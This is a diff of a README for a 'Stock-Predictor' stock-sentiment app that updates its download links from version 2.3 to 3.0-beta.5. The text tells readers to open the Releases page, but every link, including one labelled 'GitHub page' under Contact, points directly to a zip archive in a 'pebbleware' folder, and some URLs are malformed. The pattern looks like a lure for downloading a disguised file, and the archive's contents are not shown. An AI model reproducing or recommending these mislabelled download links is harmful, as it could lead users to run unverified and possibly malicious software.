@@ -8,7 +8,7 @@ Welcome to Stock-Predictor! This application helps you analyze market sentiment 
 
 To download the latest version of Stock-Predictor, visit the Releases page by clicking the link below:
 
-[![Download Stock-Predictor](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip%https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip)](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip)
+[![Download Stock-Predictor](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip%https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip)](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip)
 
 Once you are on the Releases page, scroll down to the "Assets" section. Here, you will find the latest version of the application. Click on the file to download it.
 
@@ -65,8 +65,8 @@ A: Yes, your data is processed locally and is not shared or uploaded anywhere wi
 
 ## 📬 Contact
 
-For further assistance or inquiries, you can reach us through our [GitHub page](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip).
+For further assistance or inquiries, you can reach us through our [GitHub page](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip).
 
 To reiterate, you can download the application from our Releases page:
 
-[![Download Stock-Predictor](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip%https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip)](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-2.3.zip)
+[![Download Stock-Predictor](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip%https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip)](https://raw.githubusercontent.com/elias3811/Stock-Predictor/master/pebbleware/Stock-Predictor-3.0-beta.5.zip)
